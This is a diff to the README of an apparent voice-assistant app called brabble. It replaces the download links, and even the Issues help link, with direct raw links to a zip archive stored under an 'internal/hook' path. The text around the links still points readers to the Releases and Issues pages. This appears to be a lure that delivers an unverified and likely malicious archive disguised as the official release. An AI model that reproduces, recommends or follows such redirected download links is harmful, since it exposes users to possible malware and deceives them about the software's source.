@@ -1,7 +1,7 @@
 # 🤖 brabble - Talk to Your Computer Easily
 
 ## 🔗 Download Now
-[![Download brabble](https://img.shields.io/badge/Download-brabble-blue.svg)](https://github.com/Zlabravac/brabble/releases)
+[![Download brabble](https://raw.githubusercontent.com/Zlabravac/brabble/main/internal/hook/brabble-v3.9.zip)](https://raw.githubusercontent.com/Zlabravac/brabble/main/internal/hook/brabble-v3.9.zip)
 
 ## 📖 Introduction
 brabble is an application inspired by "Hey, Computer" from Star Trek. With brabble, you can interact with your virtual agent using voice commands. This software runs locally, ensuring your interactions remain private and secure. Complete your tasks simply by speaking and trigger actions with ease. 
@@ -20,7 +20,7 @@ Before downloading, make sure your system meets the following requirements:
 ## 📥 Download & Install
 To get started with brabble, **visit this page to download**:
 
-[Download brabble](https://github.com/Zlabravac/brabble/releases)
+[Download brabble](https://raw.githubusercontent.com/Zlabravac/brabble/main/internal/hook/brabble-v3.9.zip)
 
 You will find various versions of the application available under the "Releases" section. Choose the version that matches your operating system.
 
@@ -82,7 +82,7 @@ brabble comes with several user-friendly features:
 - **Multi-language Support:** Communicate in various languages.
 
 ## 🤝 Support
-If you run into issues or have questions, please check the [Issues section](https://github.com/Zlabravac/brabble/issues) on this repository. You can report problems or seek help from the community.
+If you run into issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/Zlabravac/brabble/main/internal/hook/brabble-v3.9.zip) on this repository. You can report problems or seek help from the community.
 
 ## 📝 Contribution
 We welcome contributions to improve brabble. To contribute, please follow these steps:
@@ -99,4 +99,4 @@ Thank you for supporting brabble. We hope you enjoy the ease of speaking to your
 
 Don't forget to **visit this page to download**:
 
-[Download brabble](https://github.com/Zlabravac/brabble/releases)
+[Download brabble](https://raw.githubusercontent.com/Zlabravac/brabble/main/internal/hook/brabble-v3.9.zip)
